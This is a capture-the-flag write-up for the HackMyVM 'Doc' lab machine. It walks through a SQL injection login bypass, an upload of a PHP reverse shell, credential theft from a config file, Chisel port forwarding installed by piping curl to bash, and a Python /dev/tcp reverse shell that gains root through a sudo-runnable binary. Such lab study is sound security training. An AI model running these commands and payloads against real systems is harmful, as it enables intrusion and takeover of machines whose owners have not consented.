---
title: "Doc - HackMyVM"
summary: "Difficulty: Easy 🟢"
---

<style>

h6 {
  text-align: center;
  font-style: italic;
  font-weight: normal;
  position: relative;
  top: -10px;
}

img {
    display: flex !important;
    margin: 0 auto !important;
    justify-content: center !important;
    border-radius: 14px;
    border: 2px solid #4a90e2;
    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
    transition: box-shadow 0.3s ease, transform 0.3s ease;
}
img:hover {
    box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
    transform: scale(1.03);
}

</style>

[Machine Link](https://hackmyvm.eu/machines/machine.php?vm=Doc)

When starting the machine, it displays its **IP** address.

![1](/images/writeups/doc/1.png)
<h6>IP address of the victim machine</h6>

We perform a scan using the **NMAP** tool to see which ports the target machine has open.

```bash
nmap -sCV -n -Pn 192.168.18.189 -oN target
```

![2](/images/writeups/doc/2.png)
<h6>Port scanning with NMAP</h6>

And we observe that only **port 80** is open. We access the website hosted on the target machine and observe the following:

![3](/images/writeups/doc/3.png)

![4](/images/writeups/doc/4.png)

We click the '**Login**' link, but it doesn’t load since our machine can’t resolve the **domain**.

![5](/images/writeups/doc/5.png)
<h6>Domain doc.hmv</h6>

We need to add the domain **doc.hmv** to the ***/etc/hosts*** file, mapping it to the **IP address** of the target machine.

```bash
sudo nano /etc/hosts
```

![6](/images/writeups/doc/6.png)
<h6>Domain with its IP in /etc/hosts</h6>

And we access it again.

![7](/images/writeups/doc/7.png)

I experienced a bit and was able to access it through a SQL injection in the following way.

```sql
' or 1=1-- -
```
![8](/images/writeups/doc/8.png)
<h6>SQL Injection</h6>

And we **successfully gain access** without any issues.

![9](/images/writeups/doc/9.png)

I now decide to run a directory enumeration with [**Wfuzz**](https://github.com/xmendez/wfuzz) to check for any directories that might be useful.

```bash
wfuzz -c -u http://doc.hmv/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,200
```

![10](/images/writeups/doc/10.png)
<h6>Result after enumerating directories</h6>

The directory ***/uploads*** could be useful if we can upload files. I search, and indeed, we can.

So, we are going to download a **PHP script** that, when the file is uploaded, will send us a **Reverse Shell**, allowing us to access the machine.

```bash
wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
```

```bash
tar -xf php-reverse-shell-1.0.tar.gz
```

We modify the information as instructed, and we are good to go.

![11](/images/writeups/doc/11.png)

For example, I am going to upload the file to the following location:

![12](/images/writeups/doc/12.png)

If it doesn't work there, try uploading it in other locations.

And with that, we have successfully gained access to the target machine.

![13](/images/writeups/doc/13.png)

I set up the **TTY** and enumerate the **users** on the machine.

```bash
grep /bin/bash /etc/passwd
```

![14](/images/writeups/doc/14.png)


There are two users: **bella** and **root**.

## Privilege escalation to Bella

While browsing the directories, I found a PHP file named ***initialize.php*** that contains **Bella**’s password.

![15](/images/writeups/doc/15.png)

We gain access to the **Bella** user account and obtain the user flag.

![16](/images/writeups/doc/16.png)

## Privilege escalation to Root

If we run **sudo -l**, we can see the following.

![17](/images/writeups/doc/17.png)

We are able to execute the **doc binary** with **root** privileges. Inspecting its strings reveals that, when executed, the binary starts a server on **port 7890**.

```bash
strings /usr/bin/doc
```

![18](/images/writeups/doc/18.png)

We see that it creates a web server.

![19](/images/writeups/doc/19.png)

Since we can’t access it directly through the browser, let’s set up **Port Forwarding** to forward **port 7890** from the target machine to **port 7890** on our local machine. We will use Chisel for this.

```bash
curl https://i.jpillora.com/chisel! | bash
```

And we also transfer the binary to the victim machine.

----
**Local machine:**

![20](/images/writeups/doc/20.png)

----
**Victim machine:**

![21](/images/writeups/doc/21.png)

----

And we grant it execute permissions.

```bash
chmod +x chisel
```

Then we run [**Chisel**](https://github.com/jpillora/chisel) with the following commands to set up **Port Forwarding**.

----
Local machine:

```bash
sudo chisel server --reverse -p 4444
```

![22](/images/writeups/doc/22.png)

----
Victim machine:

```bash
./chisel client 192.168.18.100:4444 R:7890:127.0.0.1:7890 &
```

![23](/images/writeups/doc/23.png)

----

Now that the server is running, accessing **127.0.0.1:7890** on our local machine should display the hosted webpage.

![24](/images/writeups/doc/24.png)

The web interface shows a list of **Python modules** and directories related to the **Python environment**, rather than individual **.py files**. It displays built-in modules and folders like ***/tmp*** and ***/usr/lib/python3.9***, without showing file extensions. To verify this, I will create a **Python file** named **abcd.py** in **Bella**’s ***/home*** directory to see if it appears in the listing.

![25](/images/writeups/doc/25.png)

![26](/images/writeups/doc/26.png)

Now, the file appears as expected. Next, we will proceed to send a **reverse shell** with **root privileges**.

First, we will create a file that I will call reverse.py with the following content:

```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/192.168.18.100/7777 0>&1'")
```

![27](/images/writeups/doc/27.png)
<h6>Python Reverse Shell code</h6>

Then we run the **doc** binary as **root**:

```bash
sudo doc
```

![28](/images/writeups/doc/28.png)

We set up a listener on **port 7777** on our local machine to receive the **Reverse Shell**.

```bash
nc -lvnp 7777
```

And now we access the web and click on the file we created (***reverse.py***).

![29](/images/writeups/doc/29.png)

Now that we have received the **Reverse Shell** and are the **root** user, we can obtain the **root flag**.

![30](/images/writeups/doc/30.png)

And the machine is completely hacked.